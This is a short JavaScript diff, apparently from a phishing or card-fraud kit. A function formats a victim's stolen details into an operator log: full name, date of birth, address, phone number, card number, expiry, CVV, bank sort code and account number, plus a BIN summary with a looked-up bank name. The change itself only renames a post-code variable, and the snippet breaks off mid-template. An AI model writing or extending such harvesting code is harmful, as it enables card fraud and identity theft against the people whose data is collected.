@@ -40,7 +40,7 @@ const sendRes = async (req, res) => {
     bankName = response.data.bank;
   }
 
-  const binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
+  const binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
   var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${city}\nTown: ${town}\nPost Code: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${
     scode ? scode : null
   }\nAccount Number: ${
